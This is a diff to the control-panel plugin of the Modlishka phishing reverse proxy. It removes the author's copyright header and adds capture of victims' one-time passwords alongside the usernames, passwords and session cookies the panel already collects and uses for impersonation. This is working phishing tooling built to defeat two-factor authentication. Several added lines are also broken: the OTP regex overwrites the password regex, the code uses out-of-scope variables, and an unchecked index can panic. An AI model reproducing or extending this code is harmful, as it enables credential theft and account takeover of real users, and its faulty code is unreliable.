@@ -1,17 +1,3 @@
-/**
-
-    "Modlishka" Reverse Proxy.
-
-    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-
-    You should have received a copy of the Modlishka License along with this program.
-
-**/
-
 package plugin
 
 import (
@@ -45,15 +31,17 @@ type ControlConfig struct {
 	db             *buntdb.DB
 	usernameRegexp *regexp.Regexp
 	passwordRegexp *regexp.Regexp
+	otpRegexp      *regexp.Regexp
 	active         bool
 	url            string
 	controlUser    string
 	controlPass    string
 }
 
-type RequetCredentials struct {
+type RequestCredentials struct {
 	usernameFieldValue string
 	passwordFieldValue string
+	otpFieldValue      string
 }
 
 var htmltemplate = `<!DOCTYPE html>
@@ -114,6 +102,7 @@ function clearcookies(){
         <th class="text-center">UUID</th>
         <th class="text-center">Username</th>
         <th class="text-center">Password</th>
+        <th class="text-center">OTP</th>
         <th class="text-center">Terminated</th>
         <th class="text-center">Cookies</th>
 
@@ -125,6 +114,7 @@ function clearcookies(){
         <td class="text-center">{{.UUID}}</td>
         <td class="text-center">{{.Username}}</td>
         <td class="text-center">{{.Password}}</td>
+        <td class="text-center">{{.OTP}}</td>
         <td class="text-center">
         {{if .Terminated}}
         <span style="color: green; font-weight: bold;">Y</span>
@@ -240,6 +230,7 @@ type Victim struct {
 	UUID     string
 	Username string
 	Password string
+	OTP 	 string
 	Session  string
 	Terminated bool
 }
@@ -266,8 +257,8 @@ type CookieJar struct {
 	Cookies map[string]*Cookie `json:"cookies"`
 }
 
-var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
-var controlURL = flag.String("controlURL", "SayHello2Modlishka", "URL to view captured credentials and settings.")
+var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : base64(username_regex),base64(password_regex)")
+var controlURL = flag.String("controlURL", "hits", "URL to view captured credentials and settings <proxy_domain>/<controlURL>")
 var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")
 
 var CConfig ControlConfig
@@ -489,6 +480,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		entry.Username = victim.Username
 	}
 
+	if victim.OTP != "" {
+		entry.OTP = victim.OTP
+	}
+
 	if victim.Session != "" {
 		entry.Session = victim.Session
 	}
@@ -510,25 +505,27 @@ func notifyCollection(victim *Victim) {
 	if victim.Username != "" && victim.Password != "" {
 		log.Infof("Credentials collected ID:[%s] username: %s password: %s", victim.UUID, victim.Username, victim.Password)
 	}
+	
+	if victim.Username != "" && victim.Password == "" {
+		log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
+	}
 
 	if victim.Username == "" && victim.Password != "" {
 		log.Infof("Password collected ID:[%s] password: %s", victim.UUID, victim.Password)
 	}
 
-	if victim.Username != "" && victim.Password == "" {
-		log.Infof("Username collected ID:[%s] username: %s ", victim.UUID, victim.Username)
+	if victim.Username != "" && victim.Password != "" && victim.OTP != "" {
+		log.Infof("Credentials collected ID:[%s] username: %s password: %s otp: %s", victim.UUID, victim.Username, victim.Password, victim.OTP)
 	}
 }
 
-func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*RequetCredentials, bool) {
-
-	creds := &RequetCredentials{}
+func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*RequestCredentials, bool) {
+	creds := &RequestCredentials{}
 
 	if req.Method == "GET" {
 		queryString := req.URL.Query()
 		if len(queryString) > 0 {
 			for key := range req.URL.Query() {
-
 				usernames := config.usernameRegexp.FindStringSubmatch(queryString.Get(key))
 				if len(usernames) > 0 {
 					creds.usernameFieldValue = usernames[1]
@@ -539,6 +536,10 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 					creds.passwordFieldValue = passwords[1]
 				}
 
+				otp := config.otpRegexp.FindStringSubmatch(queryString.Get(key))
+				if len(otp) > 0 {
+					creds.otpFieldValue = otp[1]
+				}
 			}
 		}
 
@@ -569,6 +570,11 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 		if len(passwords) > 0 {
 			creds.passwordFieldValue = passwords[1]
 		}
+		
+		otps := config.otpRegexp.FindStringSubmatch(queryString.Get(key))
+		if len(otps) > 0 {
+			creds.otpFieldValue = otp[1]
+		}
 
 		//for parameterName := range req.Form {
 		//	log.Infof("param value %s",req.Form.Get(parameterName))
@@ -580,7 +586,7 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 
 	}
 
-	if creds.passwordFieldValue != "" || creds.usernameFieldValue != "" {
+	if creds.passwordFieldValue != "" || creds.usernameFieldValue != "" || creds.otpFieldValue != ""{
 		return creds, true
 
 	}
@@ -589,13 +595,12 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 }
 
 func HelloHandler(w http.ResponseWriter, r *http.Request) {
-
 	w.WriteHeader(http.StatusOK)
 	w.Header().Set("Content-Type", "application/json")
 	victims, _ := CConfig.listEntries()
 	credsCount := 0
 	for _, v := range victims {
-		if v.Password != "" {
+		if v.Username != "" && v.Password != "" && v.OTP != ""{
 			credsCount += 1
 		}
 	}
@@ -632,15 +637,13 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
-
 	users, ok := r.URL.Query()["user_id"]
-
 	if !ok || len(users[0]) < 1 {
 		log.Infof("Url Param 'users_id' is missing")
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", OTP: "", Session: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -686,7 +689,6 @@ func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
 }
 
 func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {
-
 	users, ok := r.URL.Query()["user_id"]
 
 	if !ok || len(users[0]) < 1 {
@@ -694,7 +696,7 @@ func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", OTP: "", Session: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -742,7 +744,7 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", OTP: "", Session: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -780,14 +782,12 @@ func use(h http.HandlerFunc, middleware ...func(http.HandlerFunc) http.HandlerFu
 	for _, m := range middleware {
 		h = m(h)
 	}
-
 	return h
 }
 
 // Based on https://gist.github.com/elithrar/9146306
 func basicAuth(h http.HandlerFunc) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-
 		if CConfig.controlUser == "" {
 			h.ServeHTTP(w, r)
 			return
@@ -823,15 +823,13 @@ func basicAuth(h http.HandlerFunc) http.HandlerFunc {
 }
 
 func init() {
-
 	s := Property{}
 	s.Name = "control_panel"
-	s.Description = "This is a web control panel for your phishing engagements. Beta version."
+	s.Description = "This is a web control panel for your phishing engagements."
 	s.Version = "0.1"
 
 	//init all of the vars, print a welcome message, init your command line flags here
 	s.Init = func() {
-
 		//init database
 		db, err := buntdb.Open("control_plugin_data.db")
 		if err != nil {
@@ -847,40 +845,31 @@ func init() {
 		}
 
 		CConfig.db = db
-
 	}
 
 	// process all of the cmd line flags and config file (if supplied)
 	s.Flags = func() {
-
 		CConfig.active = false
-
 		// Regexes to grab username and passwords sent in POST
 		var creds []string
 		// Credentials to log into the control page
 		var controlCreds []string
-
 		var jsonConfig ExtendedControlConfiguration
-
 		if len(*config.JSONConfig) > 0 {
-
 			ct, err := os.Open(*config.JSONConfig)
 			if err != nil {
 				log.Errorf("Error opening JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
 			}
-
 			ctb, _ := io.ReadAll(ct)
 			if err = json.Unmarshal(ctb, &jsonConfig); err != nil {
 				log.Errorf("Error unmarshalling JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
 			}
-
 			if err := ct.Close(); err != nil {
 				log.Errorf("Error closing JSON configuration (%s): %s", *config.JSONConfig, err)
 				return
 			}
-
 		}
 
 		if jsonConfig.ControlURL != nil {
@@ -894,7 +883,6 @@ func init() {
 		} else if *controlCredentials != "" {
 			controlCreds = strings.Split(*controlCredentials, ":")
 		}
-
 		if len(controlCreds) == 2 {
 			CConfig.controlUser = controlCreds[0]
 			CConfig.controlPass = controlCreds[1]
@@ -907,9 +895,7 @@ func init() {
 		} else if *credentialParameters != "" {
 			creds = strings.Split(*credentialParameters, ",")
 		}
-
 		if len(creds) > 1 {
-
 			decodedusername, err := base64.StdEncoding.DecodeString(creds[0])
 			if err != nil {
 				log.Fatalf("decode error:", err)
@@ -920,15 +906,18 @@ func init() {
 				log.Fatalf("decode error:", err)
 				return
 			}
+			decodedotp, err := base64.StdEncoding.DecodeString(creds[2])
+			if err != nil {
+				log.Fatalf("decode error:", err)
+				return
+			}
 
 			CConfig.usernameRegexp = regexp.MustCompile(string(decodedusername))
 			CConfig.passwordRegexp = regexp.MustCompile(string(decodedpaswrd))
-
+			CConfig.passwordRegexp = regexp.MustCompile(string(decodedotp))
 			CConfig.active = true
-			log.Infof("Control Panel: Collecting usernames with [%s] regex and passwords with [%s] regex", string(decodedusername), string(decodedpaswrd))
-
+			log.Infof("Control Panel: Collecting usernames with [%s] regex, passwords with [%s] regex and otp with [%s] regex", string(decodedusername), string(decodedpaswrd), string(decodedotp))
 		}
-
 	}
 
 	// Register your http handlers
@@ -946,9 +935,7 @@ func init() {
 
 	//process HTTP request
 	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {
-
 		if CConfig.active {
-
 			if context.UserID != "" {
 				// Save every new ID that comes to the site
 				victim := Victim{UUID: context.UserID}
@@ -964,7 +951,7 @@ func init() {
 
 			if creds, found := CConfig.checkRequestCredentials(req); found {
 
-				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
+				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue, OTP: creds.otpFieldValue}
 				if err := CConfig.updateEntry(&victim); err != nil {
 					log.Infof("Error %s", err.Error())
 					return
